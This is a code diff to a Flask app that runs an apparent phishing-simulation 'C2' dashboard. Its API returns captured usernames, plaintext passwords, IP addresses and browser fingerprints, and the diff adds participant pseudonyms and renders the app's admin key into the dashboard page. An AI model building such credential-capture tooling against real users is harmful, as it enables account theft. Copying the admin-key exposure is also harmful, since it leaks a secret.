@@ -278,8 +278,10 @@ def index():
 @app.route('/c2')
 @require_c2_auth
 def c2_dashboard():
+    key = CONFIG.get("ADMIN_KEY", "")
     return render_template('c2_dashboard.html',
-                         participant_id=session.get('participant_id', ''))
+                         participant_id=session.get('participant_id', ''),
+                         admin_key=key)
 
 @app.route('/c2/login', methods=['GET', 'POST'])
 def c2_login():
@@ -499,10 +501,13 @@ def dbcheck():
 def api_captures():
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     rows = conn.execute("""
-        SELECT id, participant_id, username, password, ip_address, user_agent,
-               timestamp, screen_resolution, timezone, browser_language,
-               platform, time_on_page, referrer, click_count, step
-        FROM captured_credentials ORDER BY id DESC LIMIT 100
+        SELECT c.id, c.participant_id, c.username, c.password, c.ip_address,
+               c.user_agent, c.timestamp, c.screen_resolution, c.timezone,
+               c.browser_language, c.platform, c.time_on_page, c.referrer,
+               c.click_count, c.step, COALESCE(v.pseudo, '') as pseudo
+        FROM captured_credentials c
+        LEFT JOIN votes_top3 v ON c.participant_id = v.participant_id
+        ORDER BY c.id DESC LIMIT 100
     """).fetchall()
     conn.close()
     return jsonify([{
@@ -515,7 +520,7 @@ def api_captures():
         "lang": r[9] or "", "platform": r[10] or "",
         "time_on_page": r[11], "referrer": r[12] or "",
         "clicks": r[13], "step": r[14] or "",
-        "pseudo": r[2] or ""
+        "pseudo": r[15] or r[2] or ""
     } for r in rows])
 
 # ── C2 Campaign API ──
